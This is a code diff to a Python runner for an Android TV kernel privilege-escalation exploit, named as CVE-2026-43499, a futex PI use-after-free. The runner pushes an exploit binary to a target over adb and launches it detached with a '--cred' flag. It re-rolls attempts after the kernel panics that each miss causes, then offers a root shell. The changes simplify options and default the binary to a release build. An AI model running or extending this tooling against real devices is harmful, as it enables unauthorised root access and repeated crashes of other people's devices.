@@ -97,24 +97,24 @@ def root_alive(host):
         return False
 
 
-def fire(host, binpath, extra_env):
+def fire(host, binpath):
     log = "/data/local/tmp/ghostlock.log"
     print("push: %s -> /data/local/tmp/ghostlock" % binpath)
     adb("push", binpath, "/data/local/tmp/ghostlock", timeout=60)
     shell(host, "chmod 755 /data/local/tmp/ghostlock")
     cmd = ("cd /data/local/tmp && rm -f %s && "
-           "nohup env %s %s ./ghostlock --cred > %s 2>&1 < /dev/null &"
-           % (log, ENV, extra_env, log))
+           "nohup env %s ./ghostlock --cred > %s 2>&1 < /dev/null &"
+           % (log, ENV, log))
     print("fire (detached): %s" % cmd)
     shell(host, cmd, timeout=15)
 
 
-def roll(host, binpath, n, extra_env):
+def roll(host, binpath, n):
     """One exploit attempt. Returns True on hit, False on a miss (which
     is always a fatal panic; the caller survives it and re-rolls)."""
     print()
-    print(">>> roll %d (env: %s %s)" % (n, ENV, extra_env))
-    fire(host, binpath, extra_env)
+    print(">>> roll %d (env: %s)" % (n, ENV))
+    fire(host, binpath)
     t0 = time.time()
     last_up = uptime(host)
     while time.time() - t0 < ROLL_WAIT_S:
@@ -173,17 +173,11 @@ def main():
         description="ghostlock-tv runner (CVE-2026-43499 futex PI UAF)")
     p.add_argument("--host", required=True,
                    help="adb target host:port (e.g. 192.168.1.50:5555)")
-    p.add_argument("--bin", required=True,
+    p.add_argument("--bin", default="ghostlock",
                    help="exploit binary built for the target kernel "
-                        "(this repo does not ship one)")
+                        "(default: ghostlock, the release binary)")
     p.add_argument("--rolls", type=int, default=6,
                    help="max exploit attempts (default 6)")
-    p.add_argument("--settle", type=int, default=SETTLE_S,
-                   help="seconds to settle after each panic reboot "
-                        "(default 45)")
-    p.add_argument("--env", action="append", default=[],
-                   help="extra env for the exploit (repeatable), "
-                        "e.g. --env GHOST_SELINUX=0")
     p.add_argument("--no-shell", action="store_true",
                    help="do not drop into the interactive root shell")
     a = p.parse_args()
@@ -191,7 +185,6 @@ def main():
     if not os.path.exists(a.bin):
         print("missing exploit binary: %s (--bin PATH)" % a.bin)
         sys.exit(3)
-    extra_env = " ".join(a.env)
 
     print()
     print("*" * 70)
@@ -213,10 +206,10 @@ def main():
         print("root daemon already alive: skipping the exploit")
     else:
         for n in range(1, a.rolls + 1):
-            if roll(a.host, a.bin, n, extra_env):
+            if roll(a.host, a.bin, n):
                 break
-            print("roll %d missed; settling %ds" % (n, a.settle))
-            time.sleep(a.settle)
+            print("roll %d missed; settling %ds" % (n, SETTLE_S))
+            time.sleep(SETTLE_S)
             if not wait_authorized(a.host):
                 print("device lost authorization mid-run; abort")
                 sys.exit(4)
